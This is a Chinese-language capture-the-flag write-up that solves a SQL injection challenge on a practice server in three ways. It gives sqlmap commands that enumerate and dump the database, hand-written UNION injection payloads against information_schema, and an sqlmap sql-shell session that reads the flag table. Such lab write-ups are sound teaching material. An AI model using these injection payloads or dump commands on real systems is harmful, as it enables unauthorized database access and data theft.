姿势1：sqlmap一把梭  

通过一番摸索，发现在页面搜索post数据的地方，存在一个注入点，废话不多说，拿起我的sqlmap就是一把梭！

python sqlmap.py -u http://111.198.29.45:50797/ --data="search=a" --dbs

\-u 指定注入点地址  

\--data 指定要注入的参数

\--dbs 爆破所以数据库

![](../Images/1eff9da435f7ee48c6bfb2d4f89d2158.png)

可以看到，爆破出来2个可用数据库

除了上面的姿势，还可以使用下面的方法查询当前数据库

python sqlmap.py -u http://111.198.29.45:50797/ --data="search=a" --dbms mysql --current-db

\--dbms mysql 指定数据库类型为mysql

\--current-db 爆破当前数据库

![](../Images/8ed174e63387361b97f26e77637e4b53.png)

可以看到，当前数据库为news

有了数据库，接下来就查数据表。

查询news数据库有几张表

python sqlmap.py -u http://111.198.29.45:50797/ --data="search=a" --dbms mysql -D news --tables

\-D news 指定数据库

\--tables 爆破所有数据表

![](../Images/fee11e762dbf2e3e3c018a173ac4e7df.png)

可以看到，爆破出了2张数据表

有了数据表，接下来就是爆破字段了  

查询secret\_table表的字段

python sqlmap.py -u http://111.198.29.45:50797/ --data="search=a" --dbms mysql -D news -T secret\_table --columns

\-T secret\_table 指定数据表

\--columns 爆破所有列

![](../Images/26a66977e40ded50fe32984027460e27.png)

可以看到，有2个字段，id和f14g

  

flag字段就这么出现了，惊不惊喜，意不意外，难道这就是命运的安排吗？  

  

还不抓紧爆一下字段内容，你还在那寻思啥呢你啊！（野狼disco）  

python sqlmap.py -u http://111.198.29.45:50797/ --data="search=a" --dbms mysql -D news -T secret\_table --dump

\--dump 爆出指定表的字段内容

![](../Images/2a491ea3e94fb00e672f807d6d7f911b.png)

姿势2：union联合注入手工猜解

常用猜解要点整理如下  

  

判断注入点：

123' -- 

'把前面的单引号闭合  

\--把后面的查询语句片段注释掉

判断列数：

123' order by 3--

判断显示位：

123' union select 1,2,3--

爆表

123' union select 1,group\_concat(table\_name),3 from information\_schema.tables where table\_schema=database() --

爆字段

123' union select 1,group\_concat(column\_name),3 from information\_schema.columns where table\_name='secret\_table'--

爆值

123' union select 1,group\_concat(fl4g),3 from secret\_table--

  

本题注入点为：

1' union select 1,2,3 #

![](../Images/9351d0d5ebb7d6736fcbfb15a99c5821.png)

很明显，23为显示位

下面爆破一下当前数据名：

1' union select 1,database(),3#

![](../Images/cae29639f2f96ccdd8cfd24eb20cad32.png)

已经出来了，2显示位变成了news  

接着就是爆破表啦：

1' union select 1,table\_name,3 from information\_schema.tables where table\_schema ='news' #

![](../Images/c4731aa19c5dc744e5883013fd52014d.png)

已经出来了，不信你看显示位2

接着就是爆破字段：

1' union select 1,column\_name,3 from information\_schema.columns where table\_name ='secret\_table' #

![](../Images/10a8a7dd48cfc3502c3241d7ddb922e4.png)

那么大一个f14g，我都看见了

临门一脚了，猥琐发育，不要浪:

1' union select 1,fl4g,3 from secret\_table where id ='1' #

![](../Images/f02adba0785a4cc4ae62a3b23b88d0fc.png)

double kill，搞定！

  

姿势3：sql-shell 数据库交互

python sqlmap.py -u http://111.198.29.45:50797/ --data="search=a" --batch --sql-shell

\--batch --sql-shell 获取注入点权限进入sql-shell模式

![](../Images/9fa29ba561dc396e32f22b2e63713146.png)

没错，已经拿到了sql-shell

常规操作，查询一下数据库，命令如下：

database();

![](../Images/009eaa1d3bd3cbbbb90751c9cdd5af80.png)

查到了，数据库是news

接下来查询一下表吧

select group\_concat(table\_name) from information\_schema.tables where table\_schema=database()

![](../Images/be94515b26ef3487ce997a5bfef83e48.png)

查到了，数据表有2个，news和secret\_table

不要慌，查询一下列

select group\_concat(column\_name) from information\_schema.columns where table\_name='secret\_table'

![](../Images/2d09610b12f18785ca8de6f0a91cfda7.png)

查到了，有2个列字段，id和f14g

不要怂，获取flag内容

select id,f14g from secret\_table limit 0,1

![](../Images/f3355e1f80deac50b59423a62a6d4d9b.png)
